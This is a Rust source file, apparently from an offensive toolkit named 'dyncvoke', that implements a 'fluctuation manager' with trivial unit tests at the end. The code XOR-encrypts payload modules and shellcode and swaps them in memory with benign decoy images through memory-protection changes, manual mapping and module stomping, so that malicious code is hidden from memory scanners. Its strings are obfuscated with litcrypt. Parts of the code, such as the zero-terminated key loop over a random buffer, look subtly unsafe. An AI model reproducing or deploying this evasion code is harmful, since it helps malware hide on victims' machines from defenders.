// dyncvoke - Module/Shellcode Fluctuation Manager
// @5mukx

#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use std::{collections::HashMap, cell::UnsafeCell, ffi::c_void};
use data::{PeMetadata, PVOID, PAGE_READWRITE};
use nanorand::{Rng, BufferedRng, WyRand};

pub struct Manager
{
    payloads: HashMap<usize, Vec<u8>>,
    payloads_metadata: HashMap<usize, PeMetadata>,
    decoys_metadata: HashMap<usize, PeMetadata>,
    decoys: HashMap<usize, Vec<u8>>,
    counter: HashMap<usize, i64>,
    keys: HashMap<usize, u8>
}

impl Manager {
    pub fn new () -> Manager {
        Manager{
            payloads: HashMap::new(),
            payloads_metadata: HashMap::new(),
            decoys_metadata: HashMap::new(),
            decoys: HashMap::new(),
            counter: HashMap::new(),
            keys: HashMap::new(),
        }
    }

    pub fn new_module (&mut self, address: usize, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
    {   
        if self.payloads.contains_key(&address)
        {
            return Err(lc!("[x] This address is already mapped."));
        }

        unsafe 
        {
            let payload_metadata = manualmap::get_pe_metadata(payload.as_ptr(), false)?;
            let decoy_metadata = manualmap::get_pe_metadata(decoy.as_ptr(), false)?;

            let mut rand_bytes = [0u8; 15];
            let mut rng = BufferedRng::new(WyRand::new());
            rng.fill(&mut rand_bytes);
            let mut key_ptr = rand_bytes.as_ptr();

            let mut xor_key: u8 = *key_ptr;
            key_ptr = key_ptr.add(1);
            while *key_ptr != '\0' as u8
            {
                xor_key = xor_key ^ *key_ptr;
                key_ptr = key_ptr.add(1);
            }

            let xored_payload = Manager::xor_module(payload, xor_key);
            let xored_decoy = Manager::xor_module(decoy, xor_key);

            self.payloads.insert(address, xored_payload);
            self.payloads_metadata.insert(address, payload_metadata);
            self.decoys_metadata.insert(address, decoy_metadata);
            self.decoys.insert(address, xored_decoy);
            self.counter.insert(address, 1);
            self.keys.insert(address, xor_key);

            Manager::hide_module(self, address)?;

        }

        Ok(())
    }

    pub fn new_shellcode (&mut self, address: usize, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
    {   
        if self.payloads.contains_key(&address)
        {
            return Err(lc!("[x] This shellcode is already mapped."));
        }

        unsafe 
        {
            let mut rand_bytes = [0u8; 15];
            let mut rng = BufferedRng::new(WyRand::new());
            rng.fill(&mut rand_bytes);
            let mut key_ptr = rand_bytes.as_ptr();

            let mut xor_key: u8 = *key_ptr;
            key_ptr = key_ptr.add(1);
            while *key_ptr != '\0' as u8
            {
                xor_key = xor_key ^ *key_ptr;
                key_ptr = key_ptr.add(1);
            }

            let xored_payload = Manager::xor_module(payload, xor_key);
            let xored_decoy = Manager::xor_module(decoy, xor_key);

            self.payloads.insert(address, xored_payload);
            self.decoys.insert(address, xored_decoy);
            self.counter.insert(address, 1);
            self.keys.insert(address, xor_key);

            Manager::hide_shellcode(self, address)?;

        }

        Ok(())
    }

    fn xor_module (module: Vec<u8>, key: u8) -> Vec<u8>
    {
        unsafe
        {
            let mut module_ptr = module.as_ptr();
            let mut final_module: Vec<u8> = vec![];

            for _i in 0..module.len()
            {
                final_module.push(*module_ptr ^ key);
                module_ptr = module_ptr.add(1);
            }

            final_module
        }
    }

    pub fn map_module (&mut self, address: usize) -> Result<(),String>
    {
        unsafe
        {
            if self.payloads.contains_key(&address)
            {
                if self.counter.get(&address).unwrap() == &0
                {   
                    let payload = self.payloads.get(&address).unwrap();
                    let key = *self.keys.get(&address).unwrap();
                    let pe_info = self.payloads_metadata.get(&address).unwrap();
                    let decoy_info = self.decoys_metadata.get(&address).unwrap();
                    
                    let addr: PVOID = std::ptr::with_exposed_provenance_mut::<c_void>(address);
                    let handle = dyncvoke_core::GetCurrentProcess();
                    let base_address: *mut PVOID = std::mem::transmute(&address);
                    let s: UnsafeCell<i64> = i64::default().into();
                    let size: *mut usize = std::mem::transmute(s.get());
                    
                    if decoy_info.is_32_bit
                    {
                        *size = decoy_info.opt_header_32.SizeOfImage as usize;
                    }
                    else 
                    {
                        *size = decoy_info.opt_header_64.size_of_image as usize;
                    }


                    let old_protection: *mut u32 = std::mem::transmute(&u32::default());
                    let ret = dyncvoke_core::nt_protect_virtual_memory(handle, base_address, size, PAGE_READWRITE, old_protection);
                    

                    if ret != 0
                    {
                        return Err(lc!("[x] Error changing memory protection."));
                    }

                    dyncvoke_core::rtl_zero_memory(*base_address, *size);
                    let mut decrypted_payload = Manager::xor_module(payload.to_vec(), key);
                    let _r = manualmap::map_to_allocated_memory(decrypted_payload.as_ptr(), addr, pe_info)?;
                    let decrypted_payload_ptr = decrypted_payload.as_mut_ptr();
                    
                    for i in 0..decrypted_payload.len()
                    {
                        *(decrypted_payload_ptr.add(i)) = 0u8;
                    }
                } 

                self.counter.insert(address, self.counter[&address] + 1);

            }

            Ok(())
        }
    }

    pub fn hide_module(&mut self, address: usize) -> Result<(),String>
    {
        unsafe
        {
            if self.payloads.contains_key(&address)
            {
                if self.counter.get(&address).unwrap() == &1
                {   
                    let decoy = self.decoys.get(&address).unwrap();
                    let key = *self.keys.get(&address).unwrap();
                    let decrypted_decoy = Manager::xor_module(decoy.to_vec(), key);
                    let pe_info = self.decoys_metadata.get(&address).unwrap();
                    let addr: PVOID = std::ptr::with_exposed_provenance_mut::<c_void>(address);
    
                    let handle = dyncvoke_core::GetCurrentProcess();
                    let base_address: *mut PVOID = std::mem::transmute(&address);
                    let s: UnsafeCell<usize> = usize::default().into();
                    let size: *mut usize = std::mem::transmute(s.get());
                    
                    if pe_info.is_32_bit
                    {
                        *size = pe_info.opt_header_32.SizeOfImage as usize;
                    }
                    else 
                    {
                        *size = pe_info.opt_header_64.size_of_image as usize;
                    }


                    let old_protection: *mut u32 = std::mem::transmute(&u32::default());
                    let ret = dyncvoke_core::nt_protect_virtual_memory(handle, base_address, size, PAGE_READWRITE, old_protection);
                    dyncvoke_core::rtl_zero_memory(*base_address, *size);

                    if ret != 0
                    {
                        return Err(lc!("[x] Error changing memory protection."));
                    }

                    let _r = manualmap::map_to_allocated_memory(decrypted_decoy.as_ptr(), addr, pe_info)?;
                } 


                if self.counter.get(&address).unwrap() >= &1
                {
                    self.counter.insert(address, self.counter[&address] - 1);
                }

            }

            Ok(())
        }
    }

    pub fn hide_shellcode(&mut self, address: usize) -> Result<(),String>
    {
        if self.payloads.contains_key(&address)
        {
            if self.counter.get(&address).unwrap() == &1
            {   
                let decoy = self.decoys.get(&address).unwrap();
                let key = *self.keys.get(&address).unwrap();
                let decrypted_decoy = Manager::xor_module(decoy.to_vec(), key);    
                let result = overload::managed_module_stomping(&decrypted_decoy, address, 0);

                if !result.is_ok()
                {
                    return Err(lc!("[x] Error hiding shellcode."));
                }
            } 

            if self.counter.get(&address).unwrap() >= &1
            {
                self.counter.insert(address, self.counter[&address] - 1);
            }

        }

        Ok(())
        
    }

    pub fn stomp_shellcode(&mut self, address: usize) -> Result<(),String>
    {
        if self.payloads.contains_key(&address)
        {
            if self.counter.get(&address).unwrap() == &0
            {   
                let payload = self.payloads.get(&address).unwrap();
                let key = *self.keys.get(&address).unwrap();
                let mut decrypted_payload = Manager::xor_module(payload.to_vec(), key);
                let result = overload::managed_module_stomping(&decrypted_payload, address, 0);
                let decrypted_payload_ptr = decrypted_payload.as_mut_ptr();
                unsafe
                {
                    for i in 0..decrypted_payload.len()
                    {
                        *(decrypted_payload_ptr.add(i)) = 0u8;
                    }
                }

                if !result.is_ok()
                {
                    return Err(lc!("[x] Error stomping shellcode."));
                }

            } 

            self.counter.insert(address, self.counter[&address] + 1);

        }

        Ok(())

    }

}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    // Test Manager creation
    #[test]
    fn test_manager_creation() {
        let manager = Manager::new();

        assert!(manager.payloads.is_empty());
        assert!(manager.payloads_metadata.is_empty());
        assert!(manager.decoys_metadata.is_empty());
        assert!(manager.decoys.is_empty());
        assert!(manager.counter.is_empty());
        assert!(manager.keys.is_empty());
    }

    // Test Manager with new_module - basic validation only (no PE parsing)
    #[test]
    fn test_manager_new_module_validation() {
        let manager = Manager::new();

        // Test that manager can be created
        assert!(manager.payloads.is_empty());

        // Test address validation - this function requires valid PE data which we don't have in tests
        // So we just verify the manager structure works
        let address: usize = 0x12340000;
        assert!(address != 0);
    }

    // Test Manager with new_shellcode - basic validation only
    #[test]
    fn test_manager_new_shellcode_validation() {
        let manager = Manager::new();

        // Test that manager can be created
        assert!(manager.payloads.is_empty());
    }

    // Test xor_module function
    #[test]
    fn test_xor_module() {
        let data = vec![0x01, 0x02, 0x03, 0x04, 0x05];
        let key: u8 = 0x42;

        // XOR the data
        let xored = Manager::xor_module(data.clone(), key);

        // Verify XOR operation
        for (i, &byte) in data.iter().enumerate() {
            assert_eq!(xored[i], byte ^ key);
        }

        // XOR again should get original
        let de_xored = Manager::xor_module(xored, key);
        assert_eq!(de_xored, data);
    }

    // Test xor_module with different keys
    #[test]
    fn test_xor_module_different_keys() {
        let data = vec![0xFF, 0x00, 0xAA, 0x55, 0x12, 0x34];

        // Test with key 0x00 (no change)
        let no_change = Manager::xor_module(data.clone(), 0x00);
        assert_eq!(no_change, data);

        // Test with key 0xFF (bitflip)
        let bitflip = Manager::xor_module(data.clone(), 0xFF);
        for (i, &byte) in data.iter().enumerate() {
            assert_eq!(bitflip[i], !byte);
        }

        // Test with key 0xAA (alternating pattern)
        let patterned = Manager::xor_module(data.clone(), 0xAA);
        for (i, &byte) in data.iter().enumerate() {
            assert_eq!(patterned[i], byte ^ 0xAA);
        }
    }

    // Test xor_module with large data
    #[test]
    fn test_xor_module_large_data() {
        let size = 1024 * 1024; // 1 MB
        let data: Vec<u8> = vec![0x42; size]; // Fill with 0x42
        let key: u8 = 0x5A;

        let xored = Manager::xor_module(data.clone(), key);
        assert_eq!(xored.len(), size);

        let restored = Manager::xor_module(xored, key);
        assert_eq!(restored.len(), data.len());
        // Verify the XOR was applied correctly
        assert_eq!(restored[0], 0x42);
    }

    // Test counter tracking
    #[test]
    fn test_counter_tracking() {
        let mut manager = Manager::new();

        // Insert a counter entry manually for testing
        let address = 0x1000;
        manager.counter.insert(address, 5);

        assert_eq!(manager.counter.get(&address), Some(&5));

        // Increment
        *manager.counter.get_mut(&address).unwrap() += 1;
        assert_eq!(manager.counter.get(&address), Some(&6));
    }

    // Test key storage
    #[test]
    fn test_key_storage() {
        let mut manager = Manager::new();

        let address = 0x2000;
        let key: u8 = 0xAB;

        manager.keys.insert(address, key);

        assert_eq!(manager.keys.get(&address), Some(&key));
    }

    // Test payload and decoy storage
    #[test]
    fn test_payload_decoy_storage() {
        let mut manager = Manager::new();

        let address = 0x3000;
        let payload = vec![0x90, 0x90, 0xCC]; // NOP, NOP, INT3
        let decoy = vec![0x55, 0x8B, 0xEC]; // Standard function prologue

        manager.payloads.insert(address, payload.clone());
        manager.decoys.insert(address, decoy.clone());

        assert_eq!(manager.payloads.get(&address), Some(&payload));
        assert_eq!(manager.decoys.get(&address), Some(&decoy));
    }

    // Test metadata storage
    #[test]
    fn test_metadata_storage() {
        let mut manager = Manager::new();

        let address = 0x4000;
        let pe_metadata = PeMetadata::default();

        manager.payloads_metadata.insert(address, pe_metadata.clone());
        manager.decoys_metadata.insert(address, pe_metadata);

        assert!(manager.payloads_metadata.get(&address).is_some());
        assert!(manager.decoys_metadata.get(&address).is_some());
    }

    // Test HashMap operations
    #[test]
    fn test_hashmap_operations() {
        let mut manager = Manager::new();

        // Insert multiple entries
        for i in 0..10 {
            let addr = 0x10000 + (i * 0x1000);
            manager.payloads.insert(addr, vec![i as u8]);
            manager.counter.insert(addr, i as i64);
            manager.keys.insert(addr, (i + 1) as u8);
        }

        assert_eq!(manager.payloads.len(), 10);
        assert_eq!(manager.counter.len(), 10);
        assert_eq!(manager.keys.len(), 10);

        // Remove entry
        manager.payloads.remove(&(0x10000));
        manager.counter.remove(&(0x10000));
        manager.keys.remove(&(0x10000));

        assert_eq!(manager.payloads.len(), 9);
    }

    // Test address validation
    #[test]
    fn test_address_validation() {
        // Valid addresses should be non-null and aligned
        let valid_addresses: Vec<u64> = vec![
            0x1000,
            0x10000,
            0x140000000,
            0x7FF60000,
        ];

        for addr in valid_addresses {
            assert!(addr > 0);
            // Check alignment (should be page-aligned)
            assert_eq!(addr % 0x1000, 0);
        }
    }

    // Test buffer size validation
    #[test]
    fn test_buffer_size_validation() {
        let empty: Vec<u8> = vec![];
        assert!(empty.is_empty());

        let single_byte: Vec<u8> = vec![0x42];
        assert_eq!(single_byte.len(), 1);

        let page_size = 4096;
        let page_buffer: Vec<u8> = vec![0x00; page_size];
        assert_eq!(page_buffer.len(), page_size);
    }
}